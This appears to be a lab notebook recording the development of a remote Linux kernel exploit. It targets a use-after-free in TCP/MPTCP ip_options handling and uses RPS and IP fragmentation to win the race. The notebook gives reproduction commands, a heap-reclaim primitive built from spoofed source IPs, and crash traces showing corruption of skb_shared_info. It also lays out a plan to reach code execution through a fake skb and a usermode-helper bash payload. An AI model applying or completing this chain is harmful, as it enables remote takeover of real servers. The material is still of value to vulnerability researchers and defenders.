# Phase 2 — remote cross-CPU UAF read on the dedicated lab (2026-11-09)

> Historical note: this phase used the socket-link lab (`192.168.88.0/24`,
> SSH `:2223`). See `docs/LAB-SETUP.md` for the current tap addressing. Some
> historical artifacts referenced below (for example
> `evidence/remote-uaf-read.trace`) are not shipped.

Status: **first remote UAF read reproduced.** Full remote RCE is not yet
achieved; the remaining gates are listed at the end.

## The wall this breaks

Phase 1 concluded that the single-queue socket link serializes the
free/reader pair: on a remote NIC both the retransmitted-SYN reader and the
ACK-driven dispose run in the same softirq CPU. The local lab only ever won
the race on loopback, because the two packets were processed in the
*sender's* CPU context.

## New lever: RPS + IP fragmentation

The lab target has software RPS/RFS enabled (`rps_cpus=f`,
`rps_sock_flow_entries=32768`, `rps_flow_cnt=32768`). `get_rps_cpu()` hashes
each packet with `skb_get_hash()`:

* an unfragmented TCP packet hashes its 4-tuple (ports included);
* a **non-first IP fragment** has no L4 ports, so it hashes L3-only;
* IP reassembly is completed in the context of the CPU that processes the
  last fragment; `tcp_v4_rcv()`/`tcp_conn_request()` then run on that CPU.

So fragmenting the retransmitted SYN moves the reader to the L3 hash CPU
(constantly CPU3 on this lab), while the plain ACK for the same 4-tuple
stays on the per-flow CPU. Measured on the twin:

```
unfragmented SYN, sport 46000 -> tcp_conn_request on CPU1
same flow, two fragments      -> tcp_conn_request on CPU3
```

The ACK-driven dispose free for sport 54502 runs on **CPU1**, the fragmented
reader on **CPU3**. This is the remote analogue of the loopback sender-CPU
trick, with no host root and no target-side kprobes.

## Reproduced UAF read

Storm: `exp/mpstorm3.c` with `FRAG_SYN` (the storm SYN is sent as two IP
fragments; the capture-driven final ACK stays unfragmented), a valid MPTCP
MP_JOIN token from a live base connection, source `192.168.88.1`, target
`192.168.88.2:9800` (raw MPTCP listener, never accepts), sport 54502
(free CPU1).

Probe (filtered so only anomalous reads are recorded):

```
p:rdopt2 ip_options_build skb=%di:x64 opt=%si:x64 optlen=+8(%si):u8
filter: optlen > 60
```

Reproduction command (host):

```
cd lab
./ssh.sh legacy-debug 'sudo sh -c "echo 0 > /sys/kernel/debug/tracing/tracing_on;
  echo 0 > /sys/kernel/debug/tracing/events/kprobes/enable 2>/dev/null;
  echo > /sys/kernel/debug/tracing/kprobe_events;
  echo \"p:rdopt2 ip_options_build skb=%di:x64 opt=%si:x64 optlen=+8(%si):u8\" >> /sys/kernel/debug/tracing/kprobe_events;
  echo \"optlen > 60\" > /sys/kernel/debug/tracing/events/kprobes/rdopt2/filter;
  echo 1 > /sys/kernel/debug/tracing/events/kprobes/enable;
  echo > /sys/kernel/debug/tracing/trace; echo 1 > /sys/kernel/debug/tracing/tracing_on"'
./ssh.sh attacker 'sudo FRAG_SYN=1 /tmp/mpstorm3_frag 9800 <token> 54502 8 94 1 0 100 192.168.88.1 30000000 192.168.88.2'
```

Evidence (`evidence/remote-uaf-read.trace`):

```
<idle>-0 [003] ..s1. 5574.984148: rdopt2: (ip_options_build+0x0/0x180)
    skb=0xffff8c839c0c0a00 opt=0xffff8c8385bb3d10 optlen=107
```

`optlen=107` is `0x6b`, the `slub_debug=P` free poison: the reader on CPU3
copied a `struct ip_options` whose `optlen` byte was poisoned, i.e. it read
the object after `inet_sock_destruct()` had freed it on CPU1. Hit rate is
low (one hit in a few hundred thousand storm SYNs); spacing 90-94 us around
the measured free latency is the productive range.

## Stage-2 reclaim primitive (verified shape)

To turn the freed object into a controlled length/overflow, the reclaim must
be network-reachable and arbitrary-content. `TCP_SAVE_SYN=27` on a listener
allocates `struct saved_syn` in `tcp_reqsk_record_syn()`:

```
saved_syn = kmalloc(struct_size(saved_syn, data, len), GFP_ATOMIC);
len = skb_network_header_len(skb) + tcp_hdrlen(skb);
```

A SYN with **no IP options** and 40 bytes of TCP options gives
`len = 20 + 60 = 80`, `alloc = 12 + 80 = 92` -> kmalloc-96. Because there are
no IP options, `tcp_v4_save_options()` does not allocate, so there is no
competing same-cache object.

Verified on the twin (plain `TCP_SAVE_SYN` listener on :9801):

```
cr: tcp_conn_request skb=...
kmalloc: call_site=tcp_reqsk_record_syn+0x77/0x120 ptr=ffff8c83857d9270
         bytes_req=92 bytes_alloc=104 gfp_flags=GFP_ATOMIC
```

Mapping of the `saved_syn` bytes onto `struct ip_options` (IP header has no
options, so `data[0..19]` is the IP header and `data[20..]` the TCP header):

| ip_options field | saved_syn byte | attacker control |
|---|---|---|
| `optlen` | `data[12]` = source-IP byte 0 | spoofed source IP |
| `srr` | `data[13]` = source-IP byte 1 | spoofed source IP |
| `rr` | `data[14]` = source-IP byte 2 | spoofed source IP |
| `ts` | `data[15]` = source-IP byte 3 | spoofed source IP |
| `__data` | `data[20]` = TCP header | TCP ports/seq/flags/options |

A spoofed source such as `192.67.68.69` gives `optlen=192, srr=67, rr=68,
ts=69`. `ip_options_build()` then copies 192 bytes from the TCP-header data
(plus adjacent kmalloc-96 slots) into the SYN-ACK and performs the
`srr`/`rr`/`ts` 4-byte writes at attacker-controlled offsets, reaching
`skb_shared_info` (`frag_list`, `destructor_arg`).

## Remote overflow into skb_shared_info (confirmed by panic)

On the matched boot (victim/saved_syn both `kmalloc-rnd-03-96`), with RPS
enabled so the fragmented reader ran on CPU1 and the ACK/dispose on CPU2, a
600 s run with the saved_syn spray (sport 54202, 10 us) produced **four**
`optlen=107` poison reads and then a **kernel panic**:

```
RIP: 0010:skb_release_data+0x10e/0x200
RBX: 6b6b6b6b6b6b6b6b
Call Trace:
 kfree_skb_reason+0x55/0x140
 ip_build_and_send_pkt+0x270/0x2b0
 tcp_v4_send_synack+0xbd/0x210
Kernel panic - not syncing: Fatal exception in interrupt
Kernel Offset: 0x2600000 from 0xffffffff81000000
```

`skb_release_data()` dereferenced a poison-valued page pointer from the
corrupted `skb_shared_info`. A 107-byte copy from `iph+20` reaches only
`head+347`; shinfo starts at `head+384`, so this crash requires a copy of at
least ~144 bytes. The only such source is the **saved_syn reclaim with
optlen=192**: the 192-byte copy ran from `head+240` to `head+432` and
overwrote shinfo `frags[]`/`nr_frags` with the bytes of the adjacent
kmalloc-96 slab (free poison `0x6b`). This confirms remotely, on the
dedicated multi-queue lab, the exact overflow/callback memory-corruption
stage of the chain (`evidence/remote-overflow-panic.txt`).

It is **not yet controlled**: to get code execution the bytes copied into
shinfo must be a valid fake-skb pointer, and the `srr`/`rr`/`ts` writes must
plant `frag_list`/`destructor_arg` from spoofed source IPs. That needs a
kernel/heap leak from the 192-byte over-read and a staged fake skb.

## Stock-target stage-2 reclaim (2026-11-10, no slub_debug)

The stock target (kernel 6.8.0-106, default cmdline, 4-queue tap) was booted
with `no_hash_pointers` for raw allocation pointers. The victim `inet_opt`
is allocated by the **initial SYN** and freed by the **ACK**. If both SYNs
are fragmented, the victim is allocated on the fragment CPU and freed on the
ACK CPU; the freed slot returns to the allocation CPU's slab, and a spray on
the ACK CPU cannot reclaim it (measured: 0 reuse). The working geometry is:

* **initial SYN unfragmented** -> request/`save_options` allocated on the
  free CPU (CPU0);
* **duplicate SYNs fragmented** (`FRAG_DUPS`) -> reader on the L3-hash CPU
  (CPU2);
* **plain final ACK unfragmented** -> dispose/free on CPU0;
* **`saved_syn` spray unfragmented with a CPU0 sport** -> same CPU/slab as
  the victim.

Raw-pointer measurement (`freeopt` + `kmem:kmalloc bytes_req 72|92`):

```
saved_syn reuses a freed victim slot: 41,239 in 5 s
reuse dt=1..16 us  freecpu=0  alloccpu=0
reader ip_options_build optlen=126 on CPU2: 1..5 per 120-180 s run
```

This is the **stage-2 controlled-length reclaim on the stock target**: the
reader copies 126 attacker-controlled bytes from the saved_syn. An over-read
SYN-ACK was captured with AF_PACKET (`4f 00 0064 ...`, IP len 100), because
the read-#1 optlen was 40 and the copy landed in the transmitted header
region. The `LEAK_DUMP` must use AF_PACKET (the invalid IHL makes the raw IP
socket drop the frame) and should filter on the spray marker, not packet
length.

Remaining: the 126/192 copy's bytes at the shinfo/leak offsets come from
adjacent kmalloc-96 slots. On the stock target those slots are mostly the
attacker's own saved_syn objects, so this leaks attacker data, not a kernel
pointer. Code execution still needs (a) a kernel/heap pointer from an
adjacent pointer-bearing object, (b) the `srr`/`rr`/`ts` writes to plant
`shinfo->frag_list` at a staged fake skb, and (c) the usermode-helper payload.

## Remaining gates

1. **Random kmalloc cache (1/16).** The victim `inet_opt` is allocated at
   `tcp_v4_route_req+0x91`; `saved_syn` at `tcp_reqsk_record_syn+0x77`.
   `CONFIG_RANDOM_KMALLOC_CACHES=y` puts them in the same
   `kmalloc-rnd-XX-96` with probability 1/16 per boot. `alloc_calls` needs
   `slub_debug=U`; use the instrumented twin to find a matching boot, then
   reproduce on the stock target by retrying boots.
2. **Reclaim timing.** The `saved_syn` allocation must land in the freed slot
   between the free and the reader's copy (~1 us). The spray SYN must be
   unfragmented with a source port whose RPS CPU equals the free CPU, and the
   `TCP_SAVE_SYN` listener must be reachable on that CPU.
3. **Leak parse.** With `optlen=192` and `srr=0`, the SYN-ACK carries the
   over-read bytes; parse them for a kernel text/direct-map pointer (KASLR).
4. **Payload.** With `srr/rr/ts` set, overwrite `skb_shared_info->frag_list`
   with the address of a fake `struct sk_buff` staged in kernel memory (the
   sprayed `saved_syn` slot or a leaked heap object). The prior repo's
   `rce_prep.c` fake-skb -> `destructor` -> `call_usermodehelper_exec`
   `/bin/bash -c ...` layout is the payload; it needs a leaked address.
5. **Stock target.** Re-run 1-4 on `lab/launch.sh target` (no slub_debug).
   The poison-based oracle is unavailable there; use the saved_syn content
   oracle (a distinctive TCP-header word echoed in the SYN-ACK).

## Lab state

* `legacy-debug` twin :2223 (slub_debug=P) and attacker :2224 are running.
* Raw MPTCP listeners on :9800 (`BACKLOG=4096`), TCP_SAVE_SYN listener on
  :9801, MPTCP sender on :9700, live base token held by
  `/tmp/mpsetup_remote.py` on the attacker.
* New artifacts: `exp/frag_probe.py`, `exp/saved_syn_probe.py`,
  `target/tcp_save_syn_listener.py`, `exp/mpstorm3.c` `FRAG_SYN`,
  `scripts/correlate_trace.py`, `evidence/remote-uaf-read.trace`.

## Addendum 2026-11-10 — the 126 catches were probe-assisted; victim path fixed

Correction: the `optlen=126` reads in this phase were produced with a
target-side kprobe at `ip_options_build`. That kprobe delays the function
entry between `skb_push()`'s optlen read and the copy, so it is lab
instrumentation, not a remote primitive. Without it the two reads are tens
of nanoseconds apart.

Two real bugs were also found and fixed in the current stock-lab storm:

1. The MPTCP listener on :9800 was not running; a main-only storm produced
   zero SYN-ACKs. (`setup_raw.sh` does start it; the listener had been killed
   during recovery.) Start it and refresh the token before every run.
2. The main SYN's RR option was at IP-option offset 0.
   `__ip_options_echo()` treats `sopt->rr == 0` as "no RR" and does not save
   it, so `tcp_v4_route_req` never allocated the vulnerable
   `ip_options_rcu`. A one-byte NOP before the RR option fixes this.

With both fixed, the victim allocation is real: 4,418 `bytes_req=72`
allocations from `tcp_v4_route_req+0x91` in 3 s; 12,575 victims in 5 s,
each freed exactly once (`tcp_v4_reqsk_destructor` 10,686,
`inet_sock_destruct` 1,889). Real UAF reads occur (209/5 s read a slot that
is still free, median 15 ms after the free; all on CPU0).

The `saved_syn` spray does reclaim victim addresses eventually (82/83), but
in every measured reader window the slot is taken by a same-flow 72-byte
`save_options` or stays free. With a unique-port (`SPRAY_VARYPORT`) spray at
~25k allocations/s and a dedicated spray process, the probe-filtered
`optlen>60` count is still 0 in 60 s and the probe-free AF_PACKET harvest
found 0 genuine over-read frames in 300 s. Details and numbers:
`evidence/stock-victim-path.txt`. Best runner: `lab/run_leak_vary.sh`.

